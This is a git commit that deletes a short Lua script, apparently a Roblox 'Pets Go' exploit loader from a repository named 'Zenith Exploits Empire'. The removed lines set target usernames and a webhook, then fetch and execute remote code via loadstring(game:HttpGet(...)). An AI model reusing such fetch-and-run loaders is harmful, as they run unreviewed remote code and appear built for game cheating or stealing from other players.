375bfd6549a9429f499b449179a1f3ab8618b80b
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-19 10:45:44 +0200

    Delete pets go/test.lua

--- pets go/test.lua
+++
@@ -1,5 +0,0 @@
-Username = "Dabird_Bedwars"
-Username2 = "Dabird_Bedwars"
-Webhook = "sidd.com"
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20pets%20go"))()
